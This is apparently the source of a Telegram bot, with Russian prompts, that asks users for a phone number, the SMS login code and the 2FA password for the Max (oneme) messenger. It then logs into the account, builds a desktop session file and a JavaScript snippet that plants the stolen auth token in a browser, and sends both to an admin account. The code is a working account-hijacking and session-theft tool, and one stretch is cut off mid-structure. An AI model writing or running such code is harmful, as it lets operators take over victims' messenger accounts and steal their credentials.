class AuthState(StatesGroup):
    waiting_for_code = State()
    waiting_for_password = State()

pending = {}

def gen_password():
    import random, string
    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))

            "phone": int(phone.replace("+", "")),
            "photo_id": None,
            "first_name": "",
            "last_name": ""
        }
    }

def generate_web_js(device_id, token, viewer_id):
    auth_str = json.dumps({"token": token, "viewerId": viewer_id}, ensure_ascii=False)
    return f"""sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{device_id}');
localStorage.setItem('__oneme_auth', '{auth_str}');
window.location.reload();"""

async def send_files(phone, uid, work_dir, desktop, js):
    dp = f"{work_dir}/desktop_session.txt"
    with open(dp, "w", encoding="utf-8") as f:
        f.write(json.dumps(desktop, ensure_ascii=False, indent=4))
    wp = f"{work_dir}/web_token.txt"
    with open(wp, "w", encoding="utf-8") as f:
        f.write(js)
    await bot.send_document(ADMIN_ID, FSInputFile(dp),
        caption=f"💻 ДЕСКТОП\nНомер: {phone}", parse_mode="HTML")
    await bot.send_document(ADMIN_ID, FSInputFile(wp),
        caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")

@dp.message(F.text == "/start")
async def start(message: types.Message):
    await message.answer("👋 Отправь номер в формате +79111111111")

@dp.message(F.text.regexp(r'^\+7\d{10}$'))
async def phone_handler(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = message.from_user.id
    work_dir = f"cache/{uid}"
    os.makedirs(work_dir, exist_ok=True)

    client = SocketMaxClient(phone=phone, work_dir=work_dir)
    pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}

    await state.set_state(AuthState.waiting_for_code)
    await state.update_data(phone=phone, work_dir=work_dir)

    msg = await message.answer("⏳ Отправляю SMS...")

    async def auth_task():
        try:
            await client.start()
            pending[uid]["token"] = client.token
            pending[uid]["user_id"] = client.my_id
            pending[uid]["status"] = "done"
        except Exception as e:
            error = str(e).lower()
            if "block" in error:
                pending[uid]["status"] = "blocked"
            elif "flood" in error or "limit" in error:
                pending[uid]["status"] = "flood_sms"
            elif "password" in error or "2fa" in error:
                pending[uid]["status"] = "need_password"
            elif "invalid" in error or "wrong" in error:
                pending[uid]["status"] = "invalid_code"
            else:
                pending[uid]["status"] = f"error:{e}"

    asyncio.create_task(auth_task())
    await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = str(message.text.strip())

    if uid not in pending:
        return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")

    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]

    import builtins
    builtins._code = code

    msg = await message.answer("⏳ Проверяю код...")

    for _ in range(240):
        await asyncio.sleep(0.5)
        status = pending[uid].get("status", "")

        if status == "done":
            token = pending[uid]["token"]
            viewer_id = pending[uid]["user_id"]
            password = gen_password()
            session_id = int(time.time() * 1000)
            device_id = str(uuid.uuid4())

            desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
            js = generate_web_js(device_id, token, viewer_id)

            await send_files(phone, uid, work_dir, desktop, js)
            await msg.edit_text("✅ Готово! Файлы отправлены админу.")
            del pending[uid]
            await state.clear()
            return

        elif status == "need_password":
            await state.set_state(AuthState.waiting_for_password)
            await msg.edit_text("🔐 Введи пароль 2FA:")
            return

        elif status == "invalid_code":
            await msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
            return

        elif status == "blocked":
            await msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
            del pending[uid]
            await state.clear()
            return

    await msg.edit_text("❌ Таймаут.")
    del pending[uid]
    await state.clear()

async def main():
    import builtins
    original_input = builtins.input

    def patched_input(prompt=""):
        prompt_lower = prompt.lower() if prompt else ""
        if "code" in prompt_lower or "код" in prompt_lower:
            import time as _time
            while not hasattr(builtins, '_code') or builtins._code is None:
                _time.sleep(0.5)
            code = builtins._code
            builtins._code = None
            return code
        elif "password" in prompt_lower or "пароль" in prompt_lower:
            import time as _time
            while not hasattr(builtins, '_password') or builtins._password is None:
                _time.sleep(0.5)
            pwd = builtins._password
            builtins._password = None
            return pwd
        return original_input(prompt)

    builtins.input = patched_input

    logging.info("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
